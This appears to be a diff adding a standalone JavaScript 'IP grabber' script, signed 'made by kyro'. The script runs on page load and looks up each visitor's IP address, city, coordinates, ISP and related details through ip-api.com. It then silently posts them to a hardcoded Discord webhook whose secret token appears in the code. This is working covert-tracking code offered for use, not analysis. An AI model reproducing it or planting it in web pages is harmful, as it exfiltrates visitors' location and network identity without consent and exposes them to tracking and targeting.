@@ -1,0 +1,109 @@
+<script>
+    async function backTick(string){
+        return "```" + string + "```";
+    };
+    async function getLocation(){
+        const response = await fetch("http://ip-api.com/json/", {
+            method: 'GET'
+        });
+        if (response.ok){
+            const data = await response.json();
+            const { as, city, country, countryCode, isp, lat, lon, org, query, region, regionName, status, timezone } = data;
+            return { as, city, country, countryCode, isp, lat, lon, org, query, region, regionName, status, timezone }
+        }
+    };
+    async function sendToWebhook(){
+        const { as, city, country, countryCode, isp, lat, lon, org, query, region, regionName, status, timezone } = await getLocation();
+        const payload = {
+            embeds: [
+                {
+                    title: "IP Grabbed",
+                    description: `[Check out my github page](https://github.com/damnkyro)`,
+                    fields: [
+                        {
+                            name: "IP Address",
+                            value: query,
+                            inline: true,
+                        },
+                        {
+                            name: "Country",
+                            value: country,
+                            inline: true,
+                        },
+                        {
+                            name: "Region",
+                            value: region,
+                            inline: true,
+                        },
+                        {
+                            name: "Coordinates",
+                            value: `${lat}, ${lon}`,
+                            inline: true,
+                        },
+                        {
+                            name: "ISP",
+                            value: isp,
+                            inline: true,
+                        },
+                        {
+                            name: "IP Address",
+                            value: query,
+                            inline: true,
+                        },
+                        {
+                            name: "Timezone",
+                            value: timezone,
+                            inline: true,
+                        },
+                        {
+                            name: "Region Name",
+                            value: regionName,
+                            inline: true,
+                        },
+                        {
+                            name: "Organisation",
+                            value: org,
+                            inline: true,
+                        },
+                        {
+                            name: "City",
+                            value: city,
+                            inline: true,
+                        },
+                        {
+                            name: "Country Code",
+                            value: countryCode,
+                            inline: true,
+                        },
+                        {
+                            name: "AS",
+                            value: as,
+                            inline: true,
+                        },
+                        
+                    ],
+                    thumbnail: {
+                        url: "https://i.pinimg.com/564x/50/10/ed/5010ed21a8c7468bd679a7e3e9e3ae6d.jpg"
+                    },
+                    footer: {
+                        text : "made by kyro",
+                    },
+                },
+            ],
+            avatar_url: "https://i.pinimg.com/564x/50/10/ed/5010ed21a8c7468bd679a7e3e9e3ae6d.jpg",
+            username: "HTML Grabber"
+        }
+        try {
+            const response = await fetch("https://discord.com/api/webhooks/1115302349951483964/_vfG73C5EIM2XQk77G2HqauGkEBPUAeTBzh5clOyeCDAvyWgjV-R49iGR4gFhbaqoTC_", {
+                method: 'POST',
+                headers: {
+                    "Content-Type" : "application/json",
+                },
+                body: JSON.stringify(payload),
+            });
+        } catch (error){
+            console.error(error);
+        }
+    };
+    sendToWebhook();
+</script>
